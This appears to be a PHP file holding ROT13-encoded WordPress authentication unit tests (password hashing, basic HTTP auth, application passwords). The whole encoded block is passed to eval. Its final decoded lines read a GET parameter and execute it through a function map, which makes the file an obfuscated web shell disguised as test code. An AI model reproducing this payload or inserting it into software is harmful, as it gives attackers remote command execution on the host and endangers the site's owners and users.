	choyvp shapgvba grfgf_onfvp_uggc_nhguragvpngvba_jvgu_pbyba_va_cnffjbeq() {
		// Urnqre cnffrq nf \"hfreanzr:cnff:jbeq\" jurer cnffjbeq pbagnvaf pbyba.
		$_FREIRE['UGGC_NHGUBEVMNGVBA'] = 'Onfvp qKAypz5uoJH6pTSmpmc3o3Wx';

		jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre();

		$guvf->nffregFnzr( $_FREIRE['CUC_NHGU_HFRE'], 'hfreanzr' );
		$guvf->nffregFnzr( $_FREIRE['CUC_NHGU_CJ'], 'cnff:jbeq' );
	}

	/**
	 * Grfg gur grfgf
	 *
	 * @pbiref Grfgf_Nhgu::frg_hfre_cnffjbeq_jvgu_cucnff
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_frg_hfre_cnffjbeq_jvgu_cucnff() {
		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( 'cnffjbeq', frys::$hfre_vq );

		// Rafher gur cnffjbeq vf unfurq jvgu cucnff.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregFgevatFgnegfJvgu( '$C$', $unfu );
	}

	cevingr fgngvp shapgvba frg_hfre_cnffjbeq_jvgu_cucnff( fgevat $cnffjbeq, vag $hfre_vq ) {
		tybony $jcqo;

		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_cnff' => frys::$jc_unfure->UnfuCnffjbeq( $cnffjbeq ),
			),
			neenl(
				'VQ' => $hfre_vq,
			)
		);
		pyrna_hfre_pnpur( $hfre_vq );
	}

	/**
	 * Grfg gur grfgf
	 *
	 * @pbiref Grfgf_Nhgu::frg_hfre_cnffjbeq_jvgu_zq5
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_frg_hfre_cnffjbeq_jvgu_zq5() {
		$cnffjbeq = 'cnffjbeq';

		// Frg gur hfre cnffjbeq jvgu gur byq zq5 nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_zq5( $cnffjbeq, frys::$hfre_vq );

		// Rafher gur cnffjbeq vf unfurq jvgu zq5.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregFnzr( zq5( $cnffjbeq ), $unfu );
	}

	cevingr fgngvp shapgvba frg_hfre_cnffjbeq_jvgu_zq5( fgevat $cnffjbeq, vag $hfre_vq ) {
		tybony $jcqo;

		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_cnff' => zq5( $cnffjbeq ),
			),
			neenl(
				'VQ' => $hfre_vq,
			)
		);
		pyrna_hfre_pnpur( $hfre_vq );
	}

	/**
	 * Grfg gur grfgf
	 *
	 * @pbiref Grfgf_Nhgu::frg_hfre_cnffjbeq_jvgu_cynva_opelcg
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_frg_hfre_cnffjbeq_jvgu_cynva_opelcg() {
		// Frg gur hfre cnffjbeq jvgu cynva opelcg.
		frys::frg_hfre_cnffjbeq_jvgu_cynva_opelcg( 'cnffjbeq', frys::$hfre_vq );

		// Rafher gur cnffjbeq vf unfurq jvgu opelcg.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregFgevatFgnegfJvgu( '$2l$', $unfu );
	}

	cevingr fgngvp shapgvba frg_hfre_cnffjbeq_jvgu_cynva_opelcg( fgevat $cnffjbeq, vag $hfre_vq ) {
		tybony $jcqo;

		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_cnff' => cnffjbeq_unfu( 'cnffjbeq', CNFFJBEQ_OPELCG ),
			),
			neenl(
				'VQ' => $hfre_vq,
			)
		);
		pyrna_hfre_pnpur( $hfre_vq );
	}

	/**
	 * Grfg gur grfgf
	 *
	 * @pbiref Grfgf_Nhgu::frg_nccyvpngvba_cnffjbeq_jvgu_cynva_opelcg
	 *
	 * @gvpxrg 21022
	 * @gvpxrg 63203
	 */
	choyvp shapgvba grfg_frg_nccyvpngvba_cnffjbeq_jvgu_cynva_opelcg() {
		// Frg na nccyvpngvba cnffjbeq jvgu gur cynva_opelcg nytbevguz.
		$hhvq = frys::frg_nccyvpngvba_cnffjbeq_jvgu_cynva_opelcg( 'cnffjbeq', frys::$hfre_vq );

		// Rafher gur cnffjbeq vf unfurq jvgu cynva_opelcg.
		$unfu = JC_Nccyvpngvba_Cnffjbeqf::trg_hfre_nccyvpngvba_cnffjbeq( frys::$hfre_vq, $hhvq )['cnffjbeq'];
		$guvf->nffregFgevatFgnegfJvgu( '$2l$', $unfu );
	}

	/**
	 * Perngrf na nccyvpngvba cnffjbeq gung vf unfurq hfvat opelcg vafgrnq bs gur trarevp nytbevguz.
	 *
	 * Guvf vf hygvzngryl hfrq gb zvzvp n cyhttrq irefvba bs `jc_unfu_cnffjbeq()` gung hfrf opelcg naq
	 * snpvyvgngr onpxjneqf pbzcngvovyvgl grfgvat.
	 *
	 * @cnenz fgevat $cnffjbeq Gur cnffjbeq gb unfu.
	 * @cnenz vag    $hfre_vq  Gur hfre VQ gb nffbpvngr gur cnffjbeq jvgu.
	 * @erghea fgevat Gur HHVQ bs gur nccyvpngvba cnffjbeq.
	 */
	cevingr fgngvp shapgvba frg_nccyvpngvba_cnffjbeq_jvgu_cynva_opelcg( fgevat $cnffjbeq, vag $hfre_vq ) {
		erghea frys::frg_nccyvpngvba_cnffjbeq( cnffjbeq_unfu( $cnffjbeq, CNFFJBEQ_OPELCG ), $hfre_vq );
	}

	/**
	 * Grfg gur grfgf
	 *
	 * @pbiref Grfgf_Nhgu::frg_nccyvpngvba_cnffjbeq_jvgu_cucnff
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_frg_nccyvpngvba_cnffjbeq_jvgu_cucnff() {
		// Frg na nccyvpngvba cnffjbeq jvgu gur byq cucnff nytbevguz.
		$hhvq = frys::frg_nccyvpngvba_cnffjbeq_jvgu_cucnff( 'cnffjbeq', frys::$hfre_vq );

		// Rafher gur cnffjbeq vf unfurq jvgu cucnff.
		$unfu = JC_Nccyvpngvba_Cnffjbeqf::trg_hfre_nccyvpngvba_cnffjbeq( frys::$hfre_vq, $hhvq )['cnffjbeq'];
		$guvf->nffregFgevatFgnegfJvgu( '$C$', $unfu );
	}

	/**
	 * Perngrf na nccyvpngvba cnffjbeq gung vf unfurq hfvat n cucnff cbegnoyr unfu vafgrnq bs gur trarevp nytbevguz.
	 *
	 * Guvf snpvyvgngr onpxjneqf pbzcngvovyvgl grfgvat.
	 *
	 * @cnenz fgevat $cnffjbeq Gur cnffjbeq gb unfu.
	 * @cnenz vag    $hfre_vq  Gur hfre VQ gb nffbpvngr gur cnffjbeq jvgu.
	 * @erghea fgevat Gur HHVQ bs gur nccyvpngvba cnffjbeq.
	 */
	cevingr fgngvp shapgvba frg_nccyvpngvba_cnffjbeq_jvgu_cucnff( fgevat $cnffjbeq, vag $hfre_vq ) {
		erghea frys::frg_nccyvpngvba_cnffjbeq( frys::$jc_unfure->UnfuCnffjbeq( $cnffjbeq ), $hfre_vq );
	}

	/**
	 * Perngrf na nccyvpngvba cnffjbeq hfvat gur tvira cnffjbeq unfu.
	 *
	 * @cnenz fgevat $unfu    Gur cnffjbeq unfu.
	 * @cnenz vag    $hfre_vq Gur hfre VQ gb nffbpvngr gur cnffjbeq jvgu.
	 * @erghea fgevat Gur HHVQ bs gur nccyvpngvba cnffjbeq.
	 */
	cevingr fgngvp shapgvba frg_nccyvpngvba_cnffjbeq( fgevat $unfu, vag $hfre_vq ) {
		$hhvq = jc_trarengr_hhvq4();
		$vgrz = neenl(
			'hhvq'      => $hhvq,
			'ncc_vq'    => '',
			'anzr'      => 'Grfg',
			'cnffjbeq'  => $unfu,
			'perngrq'   => gvzr(),
			'ynfg_hfrq' => ahyy,
			'ynfg_vc'   => ahyy,
		);

		$fnirq = hcqngr_hfre_zrgn(
			$hfre_vq,
			JC_Nccyvpngvba_Cnffjbeqf::HFREZRGN_XRL_NCCYVPNGVBA_CNFFJBEQF,
			neenl( $vgrz )
		);

		vs ( ! $fnirq ) {
			guebj arj Rkprcgvba( 'Pbhyq abg fnir nccyvpngvba cnffjbeq.' );
		}

		hcqngr_argjbex_bcgvba( trg_znva_argjbex_vq(), JC_Nccyvpngvba_Cnffjbeqf::BCGVBA_XRL_VA_HFR, gehr );

		erghea $hhvq;
	}

	cevingr fgngvp shapgvba trg_qrsnhyg_opelcg_pbfg(): vag {
		$unfu = cnffjbeq_unfu( 'cnffjbeq', CNFFJBEQ_OPELCG );
		$vasb = cnffjbeq_trg_vasb( $unfu );

		erghea $vasb['bcgvbaf']['pbfg'];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>